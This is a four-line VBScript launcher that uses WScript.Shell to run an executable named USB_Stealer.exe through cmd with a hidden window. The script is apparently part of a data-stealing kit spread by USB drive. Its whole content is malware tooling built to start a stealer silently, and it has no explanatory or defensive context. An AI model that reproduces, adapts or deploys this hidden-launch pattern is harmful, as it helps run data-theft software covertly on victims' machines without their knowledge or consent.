Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c USB_Stealer.exe"
oShell.Run strArgs, 0, false